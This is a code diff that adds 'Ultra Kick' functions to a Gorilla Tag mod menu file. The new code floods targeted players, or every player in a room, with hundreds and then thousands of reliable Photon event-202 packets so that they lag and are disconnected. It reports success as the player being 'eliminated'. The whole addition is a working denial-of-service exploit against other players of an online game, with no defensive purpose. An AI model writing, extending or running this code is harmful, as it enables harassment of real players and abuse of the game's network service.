@@ -1,4 +1,4 @@
-﻿/*
+/*
  * Quantum Menu  Mods/Overpowered.cs
  * A community driven mod menu for Gorilla Tag with over 1000+ mods
  *
@@ -8388,6 +8388,107 @@ namespace Quantum.Mods
                 }
                 lastToggleTime = Time.time;
             }
+        }
+        // --- Malachi Ultra Kick Sequence ---
+        public static string MalachiCredits = "Original logic by Malachi. Implementation by Antigravity. thx <3";
+
+        public static void UltraKickGun()
+        {
+            if (GetGunInput(false))
+            {
+                var GunData = RenderGun();
+                RaycastHit Ray = GunData.Ray;
+
+                if (GetGunInput(true))
+                {
+                    VRRig gunTarget = Ray.collider.GetComponentInParent<VRRig>();
+                    if (gunTarget && !gunTarget.IsLocal())
+                    {
+                        NetPlayer player = GetPlayerFromVRRig(gunTarget);
+                        CoroutineManager.instance.StartCoroutine(UltraKickSequence(player));
+                    }
+                }
+            }
+        }
+
+        public static void UltraKickAll()
+        {
+            if (!PhotonNetwork.InRoom) return;
+
+            foreach (NetPlayer player in NetworkSystem.Instance.AllNetPlayers)
+            {
+                if (!player.IsLocal)
+                {
+                    CoroutineManager.instance.StartCoroutine(UltraKickSequence(player));
+                }
+            }
+        }
+
+        public static IEnumerator UltraKickSequence(NetPlayer target)
+        {
+            VRRig targetRig = GetVRRigFromPlayer(target);
+            string name = targetRig != null ? targetRig.GetName() : target.NickName;
+
+            NotificationManager.SendNotification($"<color=grey>[</color><color=purple>KICK</color><color=grey>]</color> Initiating Ultra Kick on {name}...");
+            NotificationManager.SendNotification($"<color=grey>[</color><color=blue>INFO</color><color=grey>]</color> {MalachiCredits}");
+
+            // Enable Fly for better positioning
+            bool wasFlying = Buttons.GetIndex("Fly").enabled;
+            if (!wasFlying) Toggle("Fly");
+
+            float startTime = Time.time;
+            for (int i = 7; i > 0; i--)
+            {
+                NotificationManager.SendNotification($"<color=grey>[</color><color=red>KICKING</color><color=grey>]</color> {name} in {i} seconds...", 1000);
+                
+                // Freeze phase (Lag packets)
+                int view = PhotonNetwork.AllocateViewID(0);
+                for (int j = 0; j < 500; j++)
+                {
+                    PhotonNetwork.NetworkingClient.OpRaiseEvent(202, new Hashtable
+                    {
+                        { 0, "GameMode" },
+                        { 6, PhotonNetwork.ServerTimestamp },
+                        { 7, view }
+                    }, new RaiseEventOptions
+                    {
+                        TargetActors = new[] { target.ActorNumber }
+                    }, SendOptions.SendReliable);
+                }
+                
+                yield return new WaitForSeconds(1f);
+            }
+
+            NotificationManager.SendNotification($"<color=grey>[</color><color=red>KICK</color><color=grey>]</color> EXECUTING FINAL KICK!");
+
+            // Final Disconnect Burst
+            int finalView = PhotonNetwork.AllocateViewID(0);
+            for (int i = 0; i < 4000; i++)
+            {
+                PhotonNetwork.NetworkingClient.OpRaiseEvent(202, new Hashtable
+                {
+                    { 0, "GameMode" },
+                    { 6, PhotonNetwork.ServerTimestamp },
+                    { 7, finalView }
+                }, new RaiseEventOptions
+                {
+                    TargetActors = new[] { target.ActorNumber }
+                }, SendOptions.SendReliable);
+            }
+
+            yield return new WaitForSeconds(0.5f);
+
+            if (PhotonNetwork.PlayerList.Any(p => p.UserId == target.UserId))
+            {
+                NotificationManager.SendNotification($"<color=grey>[</color><color=red>ERROR</color><color=grey>]</color> Kick Failed for {name}. They might have anti-kick.");
+            }
+            else
+            {
+                NotificationManager.SendNotification($"<color=grey>[</color><color=green>SUCCESS</color><color=grey>]</color> {name} has been eliminated!");
+            }
+
+            // Cleanup
+            if (!wasFlying) Toggle("Fly");
         }
     }
 }
